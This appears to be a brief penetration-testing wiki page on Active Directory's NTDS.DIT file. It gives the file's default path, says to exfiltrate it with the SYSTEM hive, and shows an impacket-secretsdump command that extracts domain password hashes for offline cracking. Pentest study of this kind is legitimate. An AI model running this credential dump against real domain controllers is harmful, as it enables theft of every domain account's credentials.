# NTDS Tom Foolery

## Introduction

NTDS, specifically the NTDS.DIT file is not just a file within Active Directory; it is the core of the entire infrustructure. It serves as a centralized repository for all the domain’s objects and their associated information.

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## NTDS.DIT Location

The NTDS.DIT file is located typically at: `C:\Windows\NTDS\Ntds.dit`. Though Administrators can specify alternate locations on setup.

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Extracting Password Hashes

Once we have located NTDS.DIT & SYSTEM, we can exfiltrate the file back to our host and crack if offline.&#x20;

### Impacket-Secretsdump

```bash
kali@kali$ impacket-secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL -outputfile ntlm-extract
```

## The only thing left to do is:

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
